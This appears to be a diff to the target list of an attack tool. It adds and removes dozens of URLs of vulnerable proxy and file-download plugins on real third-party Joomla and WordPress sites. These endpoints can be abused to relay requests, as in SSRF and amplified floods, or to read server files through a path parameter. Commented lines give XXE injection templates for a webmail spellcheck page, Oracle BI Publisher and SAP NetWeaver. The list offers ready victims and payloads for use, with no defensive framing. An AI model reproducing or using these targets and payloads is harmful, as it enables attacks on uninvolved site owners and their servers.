@@ -35,7 +35,6 @@ http://old.ucpb.org/plugins/content/plugin_googlemap2_proxy.php?url=
 http://www.admksg.ru/plugins/content/plugin_googlemap2_proxy.php?url=
 http://www.autoklyszewski.pl/autoklyszewski/mambots/content/plugin_googlemap2_proxy.php?url=
 http://www.cbcstittsville.com/home/plugins/content/plugin_googlemap2_proxy.php?url=
-http://www.ciutatdeivissa.org/portal/plugins/content/plugin_googlemap2_proxy.php?url=
 http://www.dierenhotelspaubeek.nl/plugins/content/plugin_googlemap2_proxy.php?url=
 http://www.hortonmccormick.com/cms/plugins/content/plugin_googlemap2_proxy.php?url=
 http://www.kita-spielhaus.de/cms/plugins/content/plugin_googlemap2_proxy.php?url=
@@ -51,10 +50,7 @@ http://www.tus-haltern.de/site/plugins/content/plugin_googlemap2_proxy.php?url=
 http://www.vm-esslingen.de/cms/plugins/content/plugin_googlemap2_proxy.php?url=
 http://www.zahnarzt-buhl.de/praxis/plugins/content/plugin_googlemap2_proxy.php?url=
 http://www.bergenpol.com/cms/plugins/content/plugin_googlemap2_proxy.php?url=
-http://www.arantzabelaikastola.com/webgunea/plugins/content/plugin_googlemap2_proxy.php?url=
-http://www.fare-furore.com/plugins/content/plugin_googlemap2_proxy.php?url=
 http://www.spvgg-roedersheim.de/web/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=
-http://www.dahlnet.no/v2/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=
 http://ping-admin.ru/index.sema;POST;ping-admin.ru.txt
 http://web-sniffer.net/?url=
 http://sova-tour.com.ua/plugins/system/plugin_googlemap2_proxy.php?url=
@@ -66,7 +62,6 @@ http://es.laresmadrid.org/plugins/system/plugin_googlemap3/plugin_googlemap3_pro
 http://doleorganic.com/plugins/content/plugin_googlemap2_proxy.php?url=
 http://www.aculaval.com/joomla/plugins/system/plugin_googlemap2_proxy.php?url=
 http://www.dbaa.co.za/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=
-http://bwsnt1.pdsda.net/plugins/system/plugin_googlemap3_proxy.php?url=
 http://www.astecdisseny.com/plugins/content/plugin_googlemap2_proxy.php?url=
 http://www.fillmorefairways.com/plugins/content/plugin_googlemap2_proxy.php?url=
 http://www.bus-reichert.eu/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=
@@ -166,3 +161,27 @@ http://www.sandp.co.th/plugins/system/plugin_googlemap2_proxy.php?url=
 # http://site/webmail/spellcheck.aspx?xml=<?xml+version="1.0"+encoding="utf-8"?>%0a<!DOCTYPE+x+[%0a<!ENTITY+%25+xxe+SYSTEM+"http://site">%0a%25xxe%3b]>
 # XXE Injection in Oracle BI Publisher
 # http://site/xmlpserver/services/ServiceGateway;XML;Oracle.txt
+http://theparkshelton.com/wp-content/plugins/filedownload/download.php?path=
+http://jazzdrummerworld.com/wp-content/plugins/filedownload/download.php?path=
+http://enlivendesigns.us/wp-content/plugins/filedownload/download.php?path=
+http://kanzlei-ronnenberg.de/wp-content/plugins/filedownload/download.php?path=
+https://earthday.ca/wp-content/plugins/filedownload/download.php?path=
+http://floridaintlcollege.com/wp-content/plugins/filedownload/download.php?path=
+http://minib.pl/wp-content/plugins/filedownload/download.php?path=
+http://www.illinoiseyeinstitute.org/wp-content/plugins/filedownload/download.php?path=
+http://medicalestetic.ro/wp-content/plugins/filedownload/download.php?path=
+http://www.bigler-finearts.com/wp-content/plugins/filedownload/download.php?path=
+https://dzedzich.org/wp-content/plugins/filedownload/download.php?path=
+http://dvv-international.by/wp-content/plugins/filedownload/download.php?path=
+http://www.audi-tdi-chronik.de/wp-content/plugins/filedownload/download.php?path=
+http://www.sourcelab-plasma.com/wp-content/plugins/filedownload/download.php?path=
+http://www.ishieldz.com/new/wp-content/plugins/filedownload/download.php?path=
+http://www.gangrecordingstudio.com/wp-content/plugins/filedownload/download.php?path=
+http://eskimon.fr/wp-content/plugins/filedownload/download.php?path=
+http://www.robolift.at/wp-content/plugins/filedownload/download.php?path=
+http://www.darioianes.it/site/wp-content/plugins/filedownload/download.php?path=
+http://www.zetatekindia.com/wp-content/plugins/filedownload/download.php?path=
+# AoF (SSRF) vulnerability in WordPress
+# http://site;WP;WordPress.txt
+# XXE Injection in SAP NetWeaver AS Java
+# http://site/_tc~monitoring~webservice~web/ServerNodesWSService;XML;SAP NetWeaver.txt
